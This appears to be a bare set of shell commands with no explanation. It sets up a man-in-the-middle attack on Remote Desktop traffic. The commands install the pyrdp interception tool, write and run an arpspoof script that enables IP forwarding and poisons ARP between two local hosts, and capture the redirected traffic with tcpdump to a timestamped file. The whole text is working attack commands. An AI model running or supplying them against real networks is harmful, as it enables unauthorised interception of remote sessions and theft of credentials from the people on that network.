```bash
sudo apt install -y pipx gcc python3-dev
pipx install git+https://github.com/GoSecure/pyrdp
pipx inject pyrdp PySide2
```

```bash
cat > arpspoof.sh << 'eof'
#!/usr/bin/env bash
set -eux
sysctl -w net.ipv4.ip_forward=1
arpspoof -i eth0 -t $1 $2
eof
sudo ./arpspoof.sh 192.168.1.13{6,7}
```

```bash
sudo tcpdump -i eth0 -w - -U host 192.168.1.136 and host 192.168.1.137 and not arp | tee rdp_$(hostname)_$(date +%Y%m%d-%H%M%S).pcapng | tcpdump -r -
```
